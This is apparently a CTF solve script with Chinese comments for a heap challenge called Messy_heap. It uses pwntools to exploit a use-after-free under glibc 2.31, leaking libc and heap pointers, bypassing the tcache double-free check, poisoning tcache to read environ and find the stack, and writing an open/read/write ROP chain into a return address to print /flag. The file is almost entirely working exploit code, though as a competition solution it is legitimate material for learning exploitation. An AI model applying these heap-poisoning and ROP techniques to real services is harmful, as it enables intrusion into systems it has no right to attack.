#!/usr/bin/env python3
"""Messy_heap (PWN-07) — delete 不清指针 UAF → tcache 双毒化 → environ 栈泄露 → add 返回槽写 ROP ORW。

用法:  python3 solve.py HOST PORT          # 决赛靶机（动态 flag，流程与本地完全一致）
       TARGET=host:port python3 solve.py
       python3 solve.py --local [./mh_local]   # 本地单发（ld 直启 wrapper，见 SOLVE.md）
前置:  附件解压到 CWD（libc.so.6 自动 rglob 定位，偏移/gadget 全部动态计算）。

glibc 2.31（Ubuntu 20.04, 9.16，无 safe-linking）。size ≤ 0x88 → 全部走 tcache；
seccomp 只杀 execve（SCMP_ACT_KILL, 0x3b）→ system/one_gadget 废，ORW 拿 flag。
hook 路线在本 libc 上是死的：__libc_free 读的是 TLS 双重间接 hook=*(*(base+0x1ebef8))，
该格在 RELRO 只读段（tcache_get 的 key 写直接 SIGSEGV），导出符号 __free_hook 是死胶水。
最终路线（全程布局无关，泄露均来自真实 bin，不依赖 brk/ASLR 姿势）：
  1. 同尺寸第 8 个 free 落 unsorted（须第 9 块作 top 屏障，否则被 top 合并）泄 libc；
  2. tcache[0x20] 单块 dup（清 key 免检测）→ 命中 &environ，size=0 零副作用读栈地址；
  3. tcache[0x90] 两轮毒化（7 真块垫计数，无需 dup）：命中 c6 复用 + 命中 add 的返回槽，
     第二次 add 的 content 直接把 ROP 写进自己的返回地址，ret 即点火 open("/flag")/read/write。
槽位账本：16 槽恰好用满（0..8 泄露、9..11 读机、12..15 ROP），账本见 SOLVE.md。
"""
import os
import re
import sys
from pathlib import Path

from pwn import ELF, context, flat, p64, process, remote, u64

# ------------------------------------------------------------- libc offsets ---
_libcs = sorted(Path(".").rglob("libc.so.6"))
assert _libcs, "libc.so.6 not found under CWD (unzip attachment first)"
libc = ELF(str(_libcs[0]), checksec=False)

# main_arena 无导出符号；x86-64 glibc 恒有 main_arena = __malloc_hook+0x10。
# 泄露值 = unsorted 头（main_arena+0x60），本地实测严格吻合。
K_LEAK = libc.sym["__malloc_hook"] + 0x10 + 0x60
# 本 libc 无裸 pop rdx; ret，用双弹版本（链上多耗一槽）
OFF_ENVIRON = libc.sym["environ"]


def _exec_segments(data):
    e = ELF(str(_libcs[0]), checksec=False)
    for s in e.segments:
        pt, fl = s.header.p_type, s.header.p_flags
        if pt in (1, "PT_LOAD") and (fl & 1):
            yield data[s.header.p_offset:s.header.p_offset + s.header.p_filesz], s.header.p_vaddr


def _find_exec(pat, name, limit=1):
    """在 libc 可执行段里做字节级 gadget 搜索（ROPgadget 深度限制会漏 syscall;ret）。"""
    data = Path(str(_libcs[0])).read_bytes()
    hits = []
    for seg, va in _exec_segments(data):
        i = 0
        while len(hits) < limit:
            i = seg.find(pat, i)
            if i < 0:
                break
            hits.append(va + i)
            i += 1
    assert hits, f"gadget not found in exec segments: {name}"
    return hits[0]


G_POP_RDI = _find_exec(b"\x5f\xc3", "pop rdi; ret")          # 2.31-0ubuntu9.16: 0x23b6a
G_POP_RSI = _find_exec(b"\x5e\xc3", "pop rsi; ret")          #   0x2601f
G_POP_RAX = _find_exec(b"\x58\xc3", "pop rax; ret")          #   0x36174
G_POP_RSP = _find_exec(b"\x5c\xc3", "pop rsp; ret")          #   0x2f70a
G_SYSCALL = _find_exec(b"\x0f\x05\xc3", "syscall; ret")      #   0x630a9
G_POP_RDX_R12 = _find_exec(b"\x5a\x41\x5c\xc3", "pop rdx; pop r12; ret")  # 0x119431

args = sys.argv[1:]
if args and args[0] == "--local":
    LOCAL_BIN = args[1] if len(args) > 1 else "./mh_local"
else:
    LOCAL_BIN = None
    if len(args) >= 2:
        HOST, PORT = args[0], int(args[1])
    elif len(args) == 1 and ":" in args[0]:
        HOST, PORT = args[0].rsplit(":", 1)
        PORT = int(PORT)
    elif os.environ.get("TARGET", "").count(":") == 1:
        HOST, PORT = os.environ["TARGET"].rsplit(":", 1)
        PORT = int(PORT)
    else:
        sys.exit("usage: python3 solve.py host port | TARGET=host:port ... | --local [bin]")

context.arch = "amd64"
context.log_level = "info"

SZ = 0x88            # 请求尺寸 → chunk 0x90：> max_fast(0x80)，第 8 个 free 落 unsorted


def start():
    if LOCAL_BIN:
        return process(LOCAL_BIN)
    return remote(HOST, PORT)


def _menu(p, choice):
    p.sendlineafter(b"> \n", str(choice).encode())


def add(p, idx, size, content):
    _menu(p, 1)
    p.sendlineafter(b"yours Index: \n", str(idx).encode())
    p.sendlineafter(b"yours Size: \n", str(size).encode())
    p.recvuntil(b"yours Content: \n")
    p.send(content)


def delete(p, idx):
    _menu(p, 2)
    p.sendlineafter(b"yours Index: \n", str(idx).encode())


def edit(p, idx, content):
    _menu(p, 3)
    p.sendlineafter(b"yours Index: \n", str(idx).encode())
    p.recvuntil(b"yours Content: \n")
    p.send(content)


def show(p, idx):
    _menu(p, 4)
    p.sendlineafter(b"yours Index: \n", str(idx).encode())
    return u64(p.recvn(8))


def main():
    p = start()

    # --- phase A: 9×0x88 → free 0..7 → tcache 7 + unsorted 1 ------------------
    # c8 是屏障：c7 紧邻 top 时第 8 个 free 会被 top 合并（fd 不落 main_arena），
    # 必须有存活块隔开 top 才能进 unsorted。
    for i in range(9):
        add(p, i, SZ, b"A" * SZ)
    for i in range(8):
        delete(p, i)

    libc_leak = show(p, 7)          # c7: unsorted fd = main_arena+0x60
    heap_leak = show(p, 6)          # c6: tcache fd = &c5_mem（2.31 裸指针，无 safe-linking）
    libc_base = libc_leak - K_LEAK
    if libc_base & 0xFFF:
        print(f"[*] libc leak {libc_leak:#x} heap {heap_leak:#x}")
        sys.exit("[-] libc leak sanity failed (K_LEAK mismatch)")
    print(f"[+] libc base = {libc_base:#x}")
    print(f"[+] heap c5   = {heap_leak:#x}")

    SETCTX = libc_base + libc.sym["setcontext"]
    ENVIRON = libc_base + OFF_ENVIRON

    # --- phase B: tcache[0x20] 单块 dup → size=0 零副作用读 &environ -----------
    add(p, 9, 0x18, b"\x00" * 0x18)        # ta（tidx0 首块，从 c7 残骸切出）
    delete(p, 9)
    edit(p, 9, p64(0) + p64(0) + p64(0))   # 清 key（绕 double-free 检测）
    delete(p, 9)                           # 二次 free：count=2
    edit(p, 9, p64(ENVIRON) + p64(0) + p64(0))  # ta.fd → &environ
    add(p, 10, 0x18, b"\x00" * 0x18)       # 还 ta（count 1）
    add(p, 11, 0, b"")                     # 命中 &environ；read size=0 零副作用
    S0 = show(p, 11)                       # envp[0] 数组地址（栈）
    print(f"[+] environ pts = {S0:#x}")

    # --- phase C: tcache[0x90] 毒化 → ROP 写进 add 自己的返回槽 -----------------
    # add 返回槽 = S0 - 0x120（argc=1；静态帧链：rsp0=S0-0x18，libc_start_main 帧
    # 0xc8 + call 压栈 0x8 + main 帧 0x18 + call 压栈 0x8），返回值低 12 位 = 0x7e8。
    # 一轮毒化两发：get#1 还 c6（content = 下半段链，落在 mem(6) 堆上，地址已知），
    # get#2 命中 add 返回槽（content = 上半段 + pop rsp 桥到 mem(6)），ret 即点火。
    ret_slot = S0 - 0x120
    mem6 = heap_leak + 0x90                # &c6_mem（= heap_leak + (6-5)*0x90）
    FLAGSTR = mem6 + 0x40                  # "/flag" 藏在下半段里
    BUF = ret_slot - 0x400                 # read 缓冲（rsp 下方空闲栈）

    # 下半段先行：毒化链头 c6(fd=ret_slot)，get#1 还 c6（content 落在 mem(6)）
    part2 = bytearray(SZ)
    part2[0x00:0x48] = flat(G_POP_RSI, BUF,                # rsi=BUF（open 已把 rsi 清 0）
                            G_POP_RAX, 0, G_SYSCALL,       # read(3, BUF, 0x60)
                            G_POP_RDI, 1, G_POP_RAX, 1, G_SYSCALL)  # write(1, BUF, 0x60)
    part2[0x48:0x50] = b"/flag\x00\x00"
    edit(p, 6, p64(ret_slot) + b"\x00" * (SZ - 8))
    add(p, 12, SZ, bytes(part2))           # get#1 → c6，content 即下半段（mem(6)）

    # 上半段：命中 add 自己的返回槽，本函数 ret 时链即点火
    part1 = bytearray(SZ)
    part1[0x00:0x78] = flat(G_POP_RDI, FLAGSTR, G_POP_RSI, 0,
                            G_POP_RAX, 2, G_SYSCALL,              # open("/flag", 0)
                            G_POP_RDI, 3, G_POP_RSI, BUF,
                            G_POP_RDX_R12, 0x60, 0)               # rdx=0x60（write 复用）
    part1[0x70:0x78] = p64(G_POP_RSP)      # rsp → mem(6)（下半段链）
    part1[0x78:0x80] = p64(mem6)
    add(p, 13, SZ, bytes(part1))           # get#2 → ret_slot ← 上半段

    data = p.recvall(timeout=3)
    m = re.search(rb"[A-Za-z0-9_]*\{[^}\n]{4,}\}", data)
    print(f"[+] output: {data[:0x80]!r}")
    if m:
        print(f"FLAG: {m.group(0).decode()}")
    else:
        print("[*] no flag pattern in output — 若远端 flag 路径非 /flag，改 FLAGSTR 内容重试")
    p.close()


if __name__ == "__main__":
    main()
